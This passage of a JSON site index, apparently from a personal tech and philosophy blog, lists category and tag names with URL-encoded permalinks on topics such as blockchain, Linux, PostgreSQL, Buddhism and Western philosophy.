9C%BA/%E7%BD%91%E7%BB%9C/"},{"name":"宗教","slug":"哲学/宗教","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%AE%97%E6%95%99/"},{"name":"跨链","slug":"区块链/跨链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E8%B7%A8%E9%93%BE/"},{"name":"联盟链","slug":"区块链/联盟链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E8%81%94%E7%9B%9F%E9%93%BE/"},{"name":"密码学","slug":"区块链/密码学","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"PostgreSQL","slug":"PostgreSQL","permalink":"https://bighu630.github.io/tags/PostgreSQL/"},{"name":"故障排查","slug":"故障排查","permalink":"https://bighu630.github.io/tags/%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/"},{"name":"数据库优化","slug":"数据库优化","permalink":"https://bighu630.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96/"},{"name":"监控告警","slug":"监控告警","permalink":"https://bighu630.github.io/tags/%E7%9B%91%E6%8E%A7%E5%91%8A%E8%AD%A6/"},{"name":"系统运维","slug":"系统运维","permalink":"https://bighu630.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"},{"name":"Chainlink","slug":"Chainlink","permalink":"https://bighu630.github.io/tags/Chainlink/"},{"name":"链下计算","slug":"链下计算","permalink":"https://bighu630.github.io/tags/%E9%93%BE%E4%B8%8B%E8%AE%A1%E7%AE%97/"},{"name":"预言机","slug":"预言机","permalink":"https://bighu630.github.io/tags/%E9%A2%84%E8%A8%80%E6%9C%BA/"},{"name":"智能合约","slug":"智能合约","permalink":"https://bighu630.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"去中心化","slug":"去中心化","permalink":"https://bighu630.github.io/tags/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96/"},{"name":"2025","slug":"2025","permalink":"https://bighu630.github.io/tags/2025/"},{"name":"交易所","slug":"交易所","permalink":"https://bighu630.github.io/tags/%E4%BA%A4%E6%98%93%E6%89%80/"},{"name":"面经","slug":"面经","permalink":"https://bighu630.github.io/tags/%E9%9D%A2%E7%BB%8F/"},{"name":"solana","slug":"solana","permalink":"https://bighu630.github.io/tags/solana/"},{"name":"二元论","slug":"二元论","permalink":"https://bighu630.github.io/tags/%E4%BA%8C%E5%85%83%E8%AE%BA/"},{"name":"克尔恺郭尔","slug":"克尔恺郭尔","permalink":"https://bighu630.github.io/tags/%E5%85%8B%E5%B0%94%E6%81%BA%E9%83%AD%E5%B0%94/"},{"name":"语言","slug":"语言","permalink":"https://bighu630.github.io/tags/%E8%AF%AD%E8%A8%80/"},{"name":"go","slug":"go","permalink":"https://bighu630.github.io/tags/go/"},{"name":"八股文","slug":"八股文","permalink":"https://bighu630.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"},{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"},{"name":"资产桥","slug":"资产桥","permalink":"https://bighu630.github.io/tags/%E8%B5%84%E4%BA%A7%E6%A1%A5/"},{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"},{"name":"审美","slug":"审美","permalink":"https://bighu630.github.io/tags/%E5%AE%A1%E7%BE%8E/"},{"name":"git","slug":"git","permalink":"https://bighu630.github.io/tags/git/"},{"name":"solidity","slug":"solidity","permalink":"https://bighu630.github.io/tags/solidity/"},{"name":"合约升级","slug":"合约升级","permalink":"https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%8D%87%E7%BA%A7/"},{"name":"容器时区","slug":"容器时区","permalink":"https://bighu630.github.io/tags/%E5%AE%B9%E5%99%A8%E6%97%B6%E5%8C%BA/"},{"name":"ssh","slug":"ssh","permalink":"https://bighu630.github.io/tags/ssh/"},{"name":"gpg","slug":"gpg","permalink":"https://bighu630.github.io/tags/gpg/"},{"name":"hyprland","slug":"hyprland","permalink":"https://bighu630.github.io/tags/hyprland/"},{"name":"kde","slug":"kde","permalink":"https://bighu630.github.io/tags/kde/"},{"name":"文件管理器","slug":"文件管理器","permalink":"https://bighu630.github.io/tags/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/"},{"name":"acme证书","slug":"acme证书","permalink":"https://bighu630.github.io/tags/acme%E8%AF%81%E4%B9%A6/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://bighu630.github.io/tags/cloudflare/"},{"name":"以太坊","slug":"以太坊","permalink":"https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"占星","slug":"占星","permalink":"https://bighu630.github.io/tags/%E5%8D%A0%E6%98%9F/"},{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"科学上网","permalink":"https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"vrf","slug":"vrf","permalink":"https://bighu630.github.io/tags/vrf/"},{"name":"konsole","slug":"konsole","permalink":"https://bighu630.github.io/tags/konsole/"},{"name":"L2","slug":"L2","permalink":"https://bighu630.github.io/tags/L2/"},{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"密钥管理","slug":"密钥管理","permalink":"https://bighu630.github.io/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"},{"name":"nginx","slug":"nginx","permalink":"https://bighu630.github.io/tags/nginx/"},{"name":"形而上学","slug":"形而上学","permalink":"https://bighu630.github.io/tags/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"},{"name":"黑客帝国","slug":"黑客帝国","permalink":"https://bighu630.github.io/tags/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/"},{"name":"拉康","slug":"拉康","permalink":"https://bighu630.github.io/tags/%E6%8B%89%E5%BA%B7/"},{"name":"精神分析","slug":"精神分析","permalink":"https://bighu630.github.io/tags/%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90/"},{"name":"伦理","slug":"伦理","permalink":"https://bighu630.github.io/tags/%E4%BC%A6%E7%90%86/"},{"name":"MPT","slug":"MPT","permalink":"https://bighu630.github.io/tags/MPT/"},{"name":"合约安全","slug":"合约安全","permalink":"https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"},{"name":"linux","slug":"linux","permalink":"https://bighu630.github.io/tags/linux/"},{"name":"grub","slug":"grub","permalink":"https://bighu630.github.io/tags/grub/"},{"name":"A股","slug":"A股","permalink":"https://bighu630.github.io/tags/A%E8%82%A1/"},{"name":"gin","slug":"gin","permalink":"https://bighu630.github.io/tags/gin/"},{"name":"jwt","slug":"jwt","permalink":"https://bighu630.github.io/tags/jwt/"},{"name":"马克思","slug":"马克思","permalink":"https://bighu630.github.io/tags/%E9%A9%AC%E5%85%8B%E6%80%9D/"},{"name":"唯心主义","slug":"唯心主义","permalink":"https://bighu630.github.io/tags/%E5%94%AF%E5%BF%83%E4%B8%BB%E4%B9%89/"},{"name":"代理","slug":"代理","permalink":"https://bighu630.github.io/tags/%E4%BB%A3%E7%90%86/"},{"name":"见佛","slug":"见佛","permalink":"https://bighu630.github.io/tags/%E8%A7%81%E4%BD%9B/"},{"name":"佛教","slug":"佛教","permalink":"https://bighu630.github.io/tags/%E4%BD%9B%E6%95%99/"},{"name":"业力","slug":"业力","permalink":"https://bighu630.github.io/tags/%E4%B8%9A%E5%8A%9B/"},{"name":"跨链","slug":"跨链","permalink":"https://bighu630.github.io/tags/%E8%B7%A8%E9%93%BE/"},{"name":"中继链","slug":"中继链","permalink":"https://bighu630.github.io/tags/%E4%B8%AD%E7%BB%A7%E9%93%BE/"},{"name":"跨链路由","slug":"跨链路由","permalink":"https://bighu630.github.io/tags/%E8%B7%A8%E9%93%BE%E8%B7%AF%E7%94%B1/"},{"name":"fabric","slug":"fabric","permalink":"https://bighu630.github.io/tags/fabric/"},{"name":"manjaro","slug":"manjaro","permalink":"https://bighu630.github.io/tags/manjaro/"},{"name":"显卡驱动","slug":"显卡驱动","permalink":"https://bighu630.github.io/tags/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/"},{"name":"考研","slug":"考研","permalink":"https://bighu630.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"密码学","slug":"密码学","permalink":"https://bighu630.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"环签名","slug":"环签名","permalink":"https://bighu630.github.io/tags/%E7%8E%AF%E7%AD%BE%E5%90%8D/"}]}